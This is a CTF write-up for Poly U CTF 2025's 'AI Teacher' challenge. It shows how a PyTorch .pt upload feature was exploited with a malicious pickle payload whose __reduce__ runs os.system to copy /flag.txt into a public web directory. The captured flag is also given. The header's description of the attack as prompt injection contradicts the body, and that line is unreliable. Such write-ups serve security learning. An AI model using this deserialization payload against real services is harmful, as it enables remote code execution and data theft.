---
title: "AI Teacher"
tag: AI
date: 2025-04-27
ctf: Poly U CTF 2025
desc: Prompt-injecting an LLM-backed grading bot into coughing up the flag.
---

# AI Teacher CTF Writeup

## Challenge Overview
![Initial Interface](https://hackmd.io/_uploads/BJ18crokeg.png)

When you first visit the page, you'll see this, no idea what's going on? Me neither.

Let's analyze the application, exploit the vulnerability, and possibly retrieve the flag.

I saw a web form for interacting with a machine learning model. I could either use the default model or upload a custom model file in `.pt` (PyTorch) format. This upload feature looked like a possible weak point to explore.

## Initial Reconnaissance
The web page allowed users to upload a `.pt` file to replace the default model. This caught my attention because file uploads can sometimes be exploited if the system doesn’t check them properly. I suspected that uploading a custom `.pt` file might allow me to run harmful code due to how PyTorch handles these files.

## Vulnerability Identification
To learn more, I searched Google for vulnerabilities in PyTorch `.pt` files. I found a GitHub post describing a deserialization vulnerability in PyTorch that could let attackers run system commands.

![Search Results](https://hackmd.io/_uploads/rJ8AcHi1ll.png)
![GitHub Post](https://hackmd.io/_uploads/rJmw7LoJeg.png)

The post included sample code to create a malicious `.pt` file that executes commands when loaded. I decided to modify this code to find and copy the `flag.txt` file to a public directory.

## Exploit Development
Here’s the Python code I used to create the malicious `.pt` file:

```python
import torch
import os

class MaliciousClass:
    def __reduce__(self):
        command = (os.system, ('cat /flag.txt > /app/public/flag.txt',))
        return command

malicious_obj = MaliciousClass()
torch.save(malicious_obj, 'malicious_checkpoint.pt')
```

This code creates a `.pt` file that, when loaded by the server, runs a command to locate `flag.txt` and copy it to `/app/public/flag.txt`.

## Retrieving the Flag
I uploaded the `malicious_checkpoint.pt` file through the web form. Then, I navigated to http://chal.polyuctf.com:1338/public/flag.txt to check if the flag was copied. The flag appeared successfully!
Flag Retrieved: ||PUCTF25{torch_load_is_not_safe_bc578364cca5d423f9a8f4feb11f88e0}||

## Conclusion
By researching PyTorch vulnerabilities and crafting a malicious `.pt` file, I exploited the file upload feature to execute a command and retrieve the flag. This challenge taught me about deserialization vulnerabilities and the importance of checking for vulnerabilities when developing applications.

